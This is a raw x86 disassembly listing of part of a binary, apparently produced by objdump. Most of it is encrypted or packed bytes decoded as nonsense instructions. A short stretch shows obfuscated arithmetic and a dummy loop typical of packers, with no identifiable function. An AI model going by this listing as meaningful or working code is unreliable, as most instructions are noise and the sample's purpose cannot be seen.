  40da44:	sbb    al,0x67
  40da46:	adc    DWORD PTR [eax-0x31f00cae],ebp
  40da4c:	pop    ds
  40da4d:	inc    ebp
  40da4e:	pop    ebx
  40da4f:	sbb    esp,DWORD PTR [edx]
  40da51:	aam    0xa7
  40da53:	enter  0x8916,0x5f
  40da57:	test   DWORD PTR [esi],esi
  40da59:	(bad)  
  40da5a:	mov    esp,0x987b26a9
  40da5f:	lea    eax,[ecx]
  40da61:	aas    
  40da62:	test   al,0x9c
  40da64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da65:	adc    bh,ch
  40da67:	fst    DWORD PTR [ecx-0x406a2493]
  40da6d:	push   edx
  40da6e:	push   ebp
  40da6f:	repnz mov al,0x55
  40da72:	jg     0x40dab9
  40da74:	fst    st(6)
  40da76:	test   BYTE PTR [eax],cl
  40da78:	pop    edx
  40da79:	jmp    0x3bc3768a
  40da7e:	fadd   DWORD PTR [esp+ebx*4+0x25]
  40da82:	sub    BYTE PTR [ebx-0x1],cl
  40da85:	scas   al,BYTE PTR es:[edi]
  40da86:	cmc    
  40da87:	adc    eax,0xe29af1cc
  40da8c:	pop    ecx
  40da8d:	ret    
  40da8e:	outs   dx,DWORD PTR ds:[esi]
  40da8f:	ja     0x40da96
  40da91:	push   esi
  40da92:	jne    0x40da75
  40da94:	fwait
  40da95:	mov    cl,0xe0
  40da97:	aam    0xa9
  40da99:	inc    ecx
  40da9a:	lahf   
  40da9b:	cmc    
  40da9c:	push   eax
  40da9d:	and    al,0x70
  40da9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daa0:	mov    ecx,0xae6de09d
  40daa5:	ror    BYTE PTR [esi],0x8b
  40daa8:	push   edx
  40daa9:	mov    cl,0xa2
  40daab:	sub    DWORD PTR [edi+0x5075a6d7],eax
  40dab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab2:	and    BYTE PTR fs:[edx+0x7f615c2d],bl
  40dab9:	data16 ins BYTE PTR es:[edi],dx
  40dabb:	retf   0xff7b
  40dabe:	sar    BYTE PTR [ecx+0x6da7f2c8],1
  40dac4:	dec    esi
  40dac5:	das    
  40dac6:	sub    ebp,esi
  40dac8:	sbb    DWORD PTR [ecx],ebp
  40daca:	push   0xffffffab
  40dacc:	lock div BYTE PTR [edx-0x27]
  40dad0:	xor    cl,al
  40dad2:	js     0x40db2c
  40dad4:	pop    esp
  40dad5:	and    eax,0xd6581910
  40dada:	into   
  40dadb:	push   ebp
  40dadc:	inc    ecx
  40dadd:	stos   DWORD PTR es:[edi],eax
  40dade:	mov    ?,WORD PTR [edi+0x4198256b]
  40dae4:	jl     0x40db2c
  40dae6:	and    al,0x6
  40dae8:	mov    dl,0x67
  40daea:	addr16 xor edi,edi
  40daed:	pushf  
  40daee:	(bad)  
  40daef:	adc    DWORD PTR [esi+0x4a59b6d],edi
  40daf5:	jae    0x40dac7
  40daf7:	pop    esi
  40daf8:	jle    0x40dac9
  40dafa:	push   eax
  40dafb:	sbb    bl,BYTE PTR [eax-0x2211004d]
  40db01:	stos   BYTE PTR es:[edi],al
  40db02:	jmp    0x84f7:0x7df32ce8
  40db09:	and    bh,BYTE PTR [ebx-0x6e]
  40db0c:	ss pop ds
  40db0e:	retf   0x61a9
  40db11:	ins    DWORD PTR es:[edi],dx
  40db12:	jb     0x40db59
  40db14:	test   ebp,0xb9021e84
  40db1a:	pop    ebp
  40db1b:	push   ebx
  40db1c:	out    0x2e,al
  40db1e:	mov    ecx,0x622b5395
  40db23:	push   edi
  40db24:	cmp    eax,0x4865794d
  40db29:	xchg   edx,ebp
  40db2b:	bound  ebx,QWORD PTR [esi+0x37889a81]
  40db31:	mov    dl,BYTE PTR [ebp-0x70]
  40db34:	pop    ecx
  40db35:	repz add BYTE PTR [esi-0x2b],0xb0
  40db3a:	imul   edx,edx,0xe42f1bb2
  40db40:	inc    ecx
  40db41:	(bad)  
  40db42:	push   0x7f1088ec
  40db47:	xor    eax,0x2307a883
  40db4c:	or     eax,0x606390b0
  40db51:	stc    
  40db52:	xor    DWORD PTR [eax],edx
  40db54:	adc    eax,ebx
  40db56:	pop    edx
  40db57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db58:	ret    0x48cf
  40db5b:	add    BYTE PTR [ecx+0x5394e432],dl
  40db61:	adc    eax,0xca6b452f
  40db66:	push   ss
  40db67:	out    dx,eax
  40db68:	shl    BYTE PTR [edx+0x3390eac4],cl
  40db6e:	adc    eax,0x846c829b
  40db73:	cs push 0xc7afd82e
  40db79:	lea    ecx,[edi+0x4e]
  40db7c:	mov    ds:0x40ecb9cf,al
  40db81:	int    0x65
  40db83:	dec    ebp
  40db84:	xchg   edi,eax
  40db85:	xchg   edi,eax
  40db86:	sub    ebx,DWORD PTR [ebx+ebx*1-0x4b66e31d]
  40db8d:	mov    ch,cl
  40db8f:	fiadd  WORD PTR [ecx-0x8c86c69]
  40db95:	add    cl,BYTE PTR [eax+0x4bcdd321]
  40db9b:	ds aaa 
  40db9d:	popa   
  40db9e:	iret   
  40db9f:	xchg   esp,eax
  40dba0:	popa   
  40dba1:	rcl    DWORD PTR [eax+0x5d],cl
  40dba4:	jmp    0xc278:0x600136bb
  40dbab:	outs   dx,DWORD PTR ds:[esi]
  40dbac:	retf   0x1621
  40dbaf:	les    edx,FWORD PTR ds:0xde53e7f1
  40dbb5:	retf   0xb7e3
  40dbb8:	mov    cl,0xd4
  40dbba:	mov    al,0x59
  40dbbc:	or     ah,ah
  40dbbe:	jmp    0xfac1a740
  40dbc3:	pop    ds
  40dbc4:	and    eax,0x458b7878
  40dbc9:	out    dx,eax
  40dbca:	inc    esi
  40dbcb:	pop    edi
  40dbcc:	xchg   esp,eax
  40dbcd:	adc    ch,bl
  40dbcf:	xchg   ecx,eax
  40dbd0:	mov    bh,0xe5
  40dbd2:	cmp    dl,dh
  40dbd4:	or     esp,DWORD PTR [esi]
  40dbd6:	xchg   esp,eax
  40dbd7:	int3   
  40dbd8:	adc    al,0x84
  40dbda:	xor    edx,DWORD PTR [ecx-0x24]
  40dbdd:	jge    0x40dc57
  40dbdf:	pop    ecx
  40dbe0:	retf   0x7780
  40dbe3:	or     edx,0x65b07b
  40dbe9:	cs inc ebp
  40dbeb:	retf   0xa8dc
  40dbee:	cli    
  40dbef:	ficom  DWORD PTR [esi]
  40dbf1:	jle    0x40dba8
  40dbf3:	inc    ecx
  40dbf4:	dec    edi
  40dbf5:	in     al,dx
  40dbf6:	cmp    ch,BYTE PTR [eax]
  40dbf8:	scas   eax,DWORD PTR es:[edi]
  40dbf9:	repz push 0x5c05f78c
  40dbff:	mov    bh,0x88
  40dc01:	imul   esi,DWORD PTR ds:[ebp+eiz*8+0x36],0xffffffbb
  40dc07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc08:	ins    BYTE PTR es:[edi],dx
  40dc09:	mov    ecx,0x37d8609a
  40dc0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc0f:	lods   al,BYTE PTR ds:[esi]
  40dc10:	xor    eax,0x90de2e9e
  40dc15:	enter  0xc3b,0xd2
  40dc19:	adc    al,0xe5
  40dc1b:	loopne 0x40dc7d
  40dc1d:	fist   DWORD PTR [esi+0x5]
  40dc20:	cmp    DWORD PTR [ebp*8+0x49d571b5],ebp
  40dc27:	lods   al,BYTE PTR ds:[esi]
  40dc28:	adc    ah,BYTE PTR [eax-0x48]
  40dc2b:	gs adc eax,0xf5fd7d43
  40dc31:	cmp    ah,BYTE PTR [ebp-0x4b]
  40dc34:	mov    edi,0xa6db0e
  40dc39:	pop    eax
  40dc3a:	div    DWORD PTR [ebp-0x2f]
  40dc3d:	jmp    0x2d84:0x87304a52
  40dc44:	jns    0x40dcbc
  40dc46:	mov    dl,0xa9
  40dc48:	adc    eax,0xeec170f4
  40dc4d:	imul   esp,ebx,0xffffffbf
  40dc50:	scas   eax,DWORD PTR es:[edi]
  40dc51:	pop    edi
  40dc52:	jmp    0x4539:0xb854b7d3
  40dc59:	or     dl,BYTE PTR [esi-0x7d]
  40dc5c:	jle    0x40dbe4
  40dc5e:	xchg   edi,eax
  40dc5f:	push   ebx
  40dc60:	xchg   edx,eax
  40dc61:	pop    ebp
  40dc62:	adc    ch,cl
  40dc64:	mov    esi,0x2e3ca7e8
  40dc69:	dec    edx
  40dc6a:	cbw    
  40dc6c:	jl     0x40dc0a
  40dc6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc6f:	frstor [ebx-0x60]
  40dc72:	and    eax,0x7386f61f
  40dc77:	push   ss
  40dc78:	aad    0x91
  40dc7a:	out    0x5e,eax
  40dc7c:	cmovbe esp,DWORD PTR [ebx+0x1]
  40dc80:	idiv   DWORD PTR [ebx-0x7f]
  40dc83:	inc    eax
  40dc84:	or     BYTE PTR [ebp-0x47],bh
  40dc87:	out    0xcd,al
  40dc89:	aam    0x6f
  40dc8b:	jge    0x40dcb3
  40dc8d:	cwde   
  40dc8e:	inc    BYTE PTR [esi-0x781ff17e]
  40dc94:	sub    BYTE PTR [edx-0x32f83416],bh
  40dc9a:	mov    esp,0x848cf419
  40dc9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dca0:	sub    DWORD PTR [edx+eax*2+0x34],ecx
  40dca4:	xchg   ebp,eax
  40dca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dca6:	xor    eax,0x9ebe382e
  40dcab:	aaa    
  40dcac:	xchg   DWORD PTR [esp+ebp*1+0x21],ecx
  40dcb0:	fimul  WORD PTR [eax-0x7f]
  40dcb3:	ret    0xec71
  40dcb6:	jbe    0x40dc3c
  40dcb8:	xlat   BYTE PTR ds:[ebx]
  40dcb9:	lea    edi,[ebx-0x6f]
  40dcbc:	xor    DWORD PTR [esi],ebp
  40dcbe:	out    0xae,eax
  40dcc0:	inc    ebx
  40dcc1:	nop
  40dcc2:	psrlw  mm5,QWORD PTR [ecx]
  40dcc5:	ror    BYTE PTR [eax+0x75decf10],1
  40dccb:	out    dx,al
  40dccc:	cdq    
  40dccd:	inc    DWORD PTR [esi-0x682438ff]
  40dcd3:	cmc    
  40dcd4:	push   edx
  40dcd5:	push   es
  40dcd6:	in     al,dx
  40dcd7:	mov    edi,0xead8b013
  40dcdc:	shr    BYTE PTR [edx-0x52660277],1
  40dce2:	fcmovnu st,st(1)
  40dce4:	das    
  40dce5:	in     eax,dx
  40dce6:	ds dec eax
  40dce8:	fisub  DWORD PTR [ebx-0x29f4e9d8]
  40dcee:	add    BYTE PTR [edi-0x143a52de],0xb8
  40dcf5:	shl    edx,0x50
  40dcf8:	test   eax,0xa1b05778
  40dcfd:	mov    ch,0xf0
  40dcff:	fcmovbe st,st(2)
  40dd01:	mov    eax,0x5088c20e
  40dd06:	stos   BYTE PTR es:[edi],al
  40dd07:	mov    al,0xf
  40dd09:	test   BYTE PTR [edx-0x15],ah
  40dd0c:	push   esi
  40dd0d:	sbb    al,0x80
  40dd0f:	in     al,0x5d
  40dd11:	shl    eax,cl
  40dd13:	loop   0x40dd33
  40dd15:	mov    DWORD PTR [esi+eax*8+0x1c],edi
  40dd19:	cmc    
  40dd1a:	or     BYTE PTR [esi-0x4a4b79b3],ah
  40dd20:	add    BYTE PTR [ebp-0x12],dl
  40dd23:	cmp    al,0x8e
  40dd25:	xor    bl,ah
  40dd27:	rcl    BYTE PTR [ecx],cl
  40dd29:	dec    esp
  40dd2a:	inc    eax
  40dd2b:	iret   
  40dd2c:	pop    eax
  40dd2d:	xor    esi,DWORD PTR [eax-0x50]
  40dd30:	dec    esp
  40dd31:	cli    
  40dd32:	sub    DWORD PTR fs:[esi+0x287b4841],eax
  40dd39:	mov    cl,0x93
  40dd3b:	mov    ch,BYTE PTR [edi+0x56]
  40dd3e:	sub    BYTE PTR [ebp-0x7e],bl
  40dd41:	xor    DWORD PTR [edx-0x728d7111],0xc894d7f
  40dd4b:	mov    ds:0x9a4b011e,al
  40dd50:	or     edx,DWORD PTR [ebp-0x5b]
  40dd53:	push   edi
  40dd54:	add    al,bl
  40dd56:	(bad)  
  40dd57:	pop    es
  40dd58:	pop    ss
  40dd59:	cld    
  40dd5a:	and    eax,0xb41076a5
  40dd5f:	or     BYTE PTR [esi],bh
  40dd61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd62:	loope  0x40dd2c
  40dd64:	lods   eax,DWORD PTR ds:[esi]
  40dd65:	test   eax,0x670cba31
  40dd6a:	dec    eax
  40dd6b:	loop   0x40ddd0
  40dd6d:	xor    ecx,DWORD PTR [ebp+edi*2+0xd]
  40dd71:	xor    eax,0xcc8c23f3
  40dd76:	xor    BYTE PTR [eax],cl
  40dd78:	cmp    BYTE PTR [ebx-0x698b971],ch
  40dd7e:	lahf   
  40dd7f:	and    bh,BYTE PTR [edi+0x7]
  40dd82:	ja     0x40dd1f
  40dd84:	into   
  40dd85:	in     eax,dx
  40dd86:	mov    esi,0x722f0c0c
  40dd8b:	jmp    0xfe59:0xb42c595d
  40dd92:	pop    ss
  40dd93:	mov    DWORD PTR [esp+ebx*1-0x5812bc52],edx
  40dd9a:	lahf   
  40dd9b:	inc    edi
  40dd9c:	push   edi
  40dd9d:	or     cl,dl
  40dd9f:	ss mov al,0x6f
  40dda2:	outs   dx,BYTE PTR ds:[esi]
  40dda3:	stos   DWORD PTR es:[edi],eax
  40dda4:	jg     0x40de22
  40dda6:	jl     0x40ddb0
  40dda8:	jg     0x40ddbf
  40ddaa:	out    0x35,eax
  40ddac:	xchg   ecx,eax
  40ddad:	ja     0x40dd7f
  40ddaf:	addr16 jnp 0x40ddde
  40ddb2:	aad    0xad
  40ddb4:	and    BYTE PTR [ecx],bl
  40ddb6:	test   eax,0x1ad422fb
  40ddbb:	jecxz  0x40de10
  40ddbd:	jo     0x40dd51
  40ddbf:	ret    0x924a
  40ddc2:	in     eax,dx
  40ddc3:	cdq    
  40ddc4:	cwde   
  40ddc5:	xor    bh,cl
  40ddc7:	xchg   esp,eax
  40ddc8:	sub    DWORD PTR [ebx],ecx
  40ddca:	fst    QWORD PTR [esi]
  40ddcc:	mov    ebx,0xeb292bf2
  40ddd1:	lds    ebx,FWORD PTR ds:0x7f1db108
  40ddd7:	xchg   edx,eax
  40ddd8:	jb     0x40ddb0
  40ddda:	pop    es
  40dddb:	push   ebp
  40dddc:	jg     0x40de25
  40ddde:	inc    ecx
  40dddf:	lock push edi
  40dde1:	ss gs leave 
  40dde4:	add    BYTE PTR gs:[edx+0x393eda1e],bl
  40ddeb:	jle    0x40de29
  40dded:	mov    cl,0x52
  40ddef:	mov    ch,0x43
  40ddf1:	or     dl,BYTE PTR [edx+ecx*8-0x70ab1970]
  40ddf8:	mov    esp,0xab1497b9
  40ddfd:	sbb    eax,0x3
  40de00:	pop    ebp
  40de01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de02:	xchg   esi,eax
  40de03:	loop   0x40ddd1
  40de05:	lahf   
  40de06:	rol    ecx,0x6d
  40de09:	pop    esp
  40de0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de0b:	outs   dx,DWORD PTR ds:[esi]
  40de0c:	dec    edi
  40de0d:	test   ah,cl
  40de0f:	cmp    al,0x2d
  40de11:	dec    eax
  40de12:	repnz test DWORD PTR [ebx-0x3],ebx
  40de16:	jno    0x40dda4
  40de18:	fidiv  WORD PTR [esi+esi*4]
  40de1b:	jle    0x40de47
  40de1d:	xor    eax,0x9d22371d
  40de22:	pop    es
  40de23:	and    BYTE PTR [ebx],dh
  40de25:	out    dx,al
  40de26:	out    dx,al
  40de27:	mov    eax,DWORD PTR [ebp+0x6f]
  40de2a:	rol    DWORD PTR [edx+0x10],cl
  40de2d:	ret    
  40de2e:	xlat   BYTE PTR ds:[ebx]
  40de2f:	inc    esp
  40de30:	das    
  40de31:	push   edx
  40de32:	shl    ebx,1
  40de34:	cmp    al,BYTE PTR [eax-0x27]
  40de37:	push   0xb24c8bf5
  40de3c:	push   cs
  40de3d:	mov    ch,0x7d
  40de3f:	mov    bl,0xb7
  40de41:	sub    al,0xd
  40de43:	out    0x1,al
  40de45:	xchg   ebp,eax
  40de47:	jp     0x40de68
  40de49:	push   ecx
  40de4a:	bound  edx,QWORD PTR [ecx-0x3f]
  40de4d:	ret    
  40de4e:	cmp    cl,BYTE PTR ds:[ebx-0x38ac03bb]
  40de55:	add    eax,0x42500c
  40de5a:	aam    0x32
  40de5c:	add    BYTE PTR [eax],al
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0x65
  40dfd4:	push   es
  40dfd5:	xor    dl,0xc5
  40dfd8:	shl    BYTE PTR [edx+0x62],cl
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx+0x2f]
  40dfe0:	gs test eax,0xc961a861
  40dfe6:	fmul   st,st(4)
  40dfe8:	push   esi
  40dfe9:	mov    ebp,0xd4a34a7c
  40dfee:	xchg   esi,eax
  40dfef:	cmp    al,0x12
  40dff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dff2:	nop
  40dff3:	jno    0x40e06f
  40dff5:	stc    
  40dff6:	add    al,0x15
  40dff8:	hlt    
  40dff9:	push   ds
  40dffa:	fadd   QWORD PTR [ebx]
  40dffc:	(bad)  [edx+0x241c15b]
  40e002:	lock movs WORD PTR es:[edi],WORD PTR ss:[esi]
  40e006:	pop    edx
  40e007:	push   eax
  40e008:	jno    0x40e04f
  40e00a:	sbb    ebp,esp
  40e00c:	xlat   BYTE PTR ds:[ebx]
  40e00d:	mov    al,dl
  40e00f:	ror    ebx,cl
  40e011:	xchg   ecx,eax
  40e012:	adc    al,0x90
  40e014:	mov    al,0xcf
  40e016:	mov    cl,0xcf
  40e018:	sbb    DWORD PTR [ebp+0x2732dde5],eax
  40e01e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e01f:	lods   al,BYTE PTR ds:[esi]
  40e020:	lea    edx,[ecx-0x25]
  40e023:	dec    ebp
  40e024:	(bad)  
  40e025:	xor    BYTE PTR ds:0x89311a94,bl
  40e02b:	nop
  40e02c:	enter  0xfbdf,0x85
  40e030:	gs iret 
  40e032:	cmc    
  40e033:	popa   
  40e034:	jmp    0x40dfec
  40e036:	and    DWORD PTR [eax-0x4439cabe],eax
  40e03c:	fimul  DWORD PTR fs:[bp-0x21]
  40e041:	daa    
  40e042:	and    DWORD PTR [ecx],edi
  40e044:	sti    
  40e045:	das    
  40e046:	pop    ds
  40e047:	mov    ds:0xa2d76499,eax
  40e04c:	out    0x70,al
  40e04e:	xchg   eax,esi
  40e050:	leave  
  40e051:	sub    ebx,eax
  40e053:	int3   
  40e054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e055:	daa    
  40e056:	enter  0x972b,0x80
  40e05a:	fsub   QWORD PTR [ebp-0x73]
  40e05d:	xlat   BYTE PTR ds:[ebx]
  40e05e:	bound  eax,QWORD PTR [edi+0xb]
  40e061:	aaa    
  40e062:	(bad)  
  40e063:	fdivr  st(5),st
  40e065:	(bad)  
  40e066:	mov    ch,0xa2
  40e068:	fist   DWORD PTR [eax+0x66]
  40e06b:	cmp    eax,0xd2357d2
  40e070:	mov    ds:0x1d87516b,eax
  40e075:	pop    esp
  40e076:	xchg   esi,eax
  40e077:	jl     0x40e084
  40e079:	jle    0x40e0db
  40e07b:	fidivr DWORD PTR [eax-0x73127ac4]
  40e081:	sub    bl,cl
  40e083:	out    dx,eax
  40e084:	jns    0x40e0a6
  40e086:	fistp  DWORD PTR [ecx]
  40e088:	dec    edx
  40e089:	sbb    ebx,DWORD PTR [esi-0x57]
  40e08c:	xchg   ecx,eax
  40e08d:	mov    al,BYTE PTR [ebx]
  40e08f:	test   eax,0x34d57197
  40e094:	xor    edx,DWORD PTR [ebx-0x1f]
  40e097:	sahf   
  40e098:	inc    ebx
  40e099:	cwde   
  40e09a:	push   edi
  40e09b:	push   eax
  40e09c:	dec    edi
  40e09d:	xor    ecx,DWORD PTR [edi+0x4a20c029]
  40e0a3:	sbb    BYTE PTR [esi],ah
  40e0a5:	es xor eax,0x570b2143
  40e0ab:	aam    0xa7
  40e0ad:	iret   
  40e0ae:	pop    es
  40e0af:	je     0x40e062
  40e0b1:	loopne 0x40e0a9
  40e0b3:	or     ah,BYTE PTR [esi]
  40e0b5:	lea    edi,ds:0xd7ccc14f
  40e0bb:	(bad)  
  40e0bc:	pop    edi
  40e0bd:	out    0x23,eax
  40e0bf:	add    DWORD PTR [ecx-0x26001e13],esp
  40e0c5:	add    al,0xda
  40e0c7:	lock xor al,0xfc
  40e0ca:	lods   al,BYTE PTR ds:[esi]
  40e0cb:	jnp    0x40e06e
  40e0cd:	ins    DWORD PTR es:[edi],dx
  40e0ce:	lock add BYTE PTR [eax],dl
  40e0d1:	cmp    BYTE PTR [eax],bh
  40e0d3:	fs dec ebx
  40e0d5:	push   esp
  40e0d6:	sar    DWORD PTR [ebx+0x9e8ca76],cl
  40e0dc:	mov    ds:0xf660ff53,eax
  40e0e1:	sbb    eax,0xab80f704
  40e0e6:	pusha  
  40e0e7:	clc    
  40e0e8:	aas    
  40e0e9:	xchg   edi,eax
  40e0ea:	jle    0x40e147
  40e0ec:	jnp    0x40e0b0
  40e0ee:	cld    
  40e0ef:	sub    DWORD PTR [edx+eax*4-0x20fb835a],edx
  40e0f6:	js     0x40e11f
  40e0f8:	fnstcw WORD PTR [ebx]
  40e0fa:	cwde   
  40e0fb:	retf   
  40e0fc:	push   esp
  40e0fd:	test   edi,eax
  40e0ff:	loop   0x40e17a
  40e101:	jne    0x40e0b3
  40e103:	inc    eax
  40e104:	push   ebx
  40e105:	in     eax,0x28
  40e107:	aad    0xd6
  40e109:	push   esi
  40e10a:	cwde   
  40e10b:	sbb    DWORD PTR [esi],ecx
  40e10d:	call   0x216a:0x1c8c5815
  40e114:	lahf   
  40e115:	mov    es,WORD PTR [esi-0x1406d1ff]
  40e11b:	pop    es
  40e11c:	or     esi,0x2108a679
  40e122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e123:	push   edx
  40e124:	je     0x40e0c4
  40e126:	mov    bh,0xd5
  40e128:	xor    ebx,DWORD PTR [esi]
  40e12a:	mov    dh,0xd1
  40e12c:	add    edi,DWORD PTR [edi]
  40e12e:	inc    edi
  40e12f:	sbb    al,0xf8
  40e131:	push   es
  40e132:	lods   eax,DWORD PTR es:[esi]
  40e134:	outs   dx,DWORD PTR ds:[esi]
  40e135:	mov    esp,0xc9cbdf90
  40e13a:	jb     0x40e0fe
  40e13c:	pop    es
  40e13d:	into   
  40e13e:	add    BYTE PTR [esp+eiz*4],0xec
  40e142:	xchg   BYTE PTR [esi+0x4b1ede2f],ch
  40e148:	jns    0x40e144
  40e14a:	mov    ss,WORD PTR [ebx-0x21]
  40e14d:	in     al,0x14
  40e14f:	and    bl,0x2e
  40e152:	(bad)  
  40e153:	jmp    0xd3388f11
  40e158:	add    al,0xdc
  40e15a:	fnstcw WORD PTR [ebx-0x41282c1]
  40e160:	test   al,0x47
  40e162:	(bad)  
  40e163:	mov    al,ds:0x97001968
  40e168:	cmp    al,0x6e
  40e16a:	sbb    al,0x19
  40e16c:	arpl   si,sp
  40e16e:	loopne 0x40e106
  40e170:	xor    al,ah
  40e172:	add    eax,0xfe730ccd
  40e177:	shl    DWORD PTR [edx+0x440a0bb9],0x7e
  40e17e:	rol    BYTE PTR [edi],cl
  40e180:	adc    dh,BYTE PTR [esp+edx*8-0x51edca91]
  40e187:	dec    esi
  40e188:	(bad)  
  40e189:	jmp    0x66b3:0x252fe427
  40e190:	inc    edi
  40e191:	pusha  
  40e192:	pop    eax
  40e193:	test   al,0x70
  40e195:	cdq    
  40e196:	xchg   DWORD PTR [ebp+ecx*4-0x6a7b1694],esp
  40e19d:	dec    ebp
  40e19e:	cwde   
  40e19f:	xor    al,0xac
  40e1a1:	sbb    BYTE PTR [esi+edi*2],ah
  40e1a4:	(bad)  
  40e1a5:	and    DWORD PTR [edi+0xb],ebx
  40e1a8:	loop   0x40e170
  40e1aa:	mov    ?,esp
  40e1ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1ad:	mov    BYTE PTR [esi],bl
  40e1af:	lods   eax,DWORD PTR ds:[esi]
  40e1b0:	add    bh,BYTE PTR [esi+0x7ef7a893]
  40e1b6:	mov    ebp,0xd6a52885
  40e1bb:	dec    ebx
  40e1bc:	mov    al,ds:0x91aa3b6b
  40e1c1:	std    
  40e1c2:	mov    ebx,0x91b714c
  40e1c7:	push   0x3146e122
  40e1cc:	ror    ebx,1
  40e1ce:	xchg   DWORD PTR ds:0x76f7026d,ebx
  40e1d4:	or     ecx,eax
  40e1d6:	pop    es
  40e1d7:	pusha  
  40e1d8:	push   edi
  40e1d9:	mov    edx,0xd2cf1c53
  40e1de:	mov    esi,DWORD PTR [esi+0x5c1492ee]
  40e1e4:	xchg   esp,eax
  40e1e5:	fs adc ebx,edi
  40e1e8:	icebp  
  40e1e9:	xor    edx,ebx
  40e1eb:	loope  0x40e172
  40e1ed:	cmp    al,0xbd
  40e1ef:	jl     0x40e1cd
  40e1f1:	and    ch,BYTE PTR [esi+0x2e7418fe]
  40e1f7:	jbe    0x40e1af
  40e1f9:	mov    bh,0xf3
  40e1fb:	pop    ds
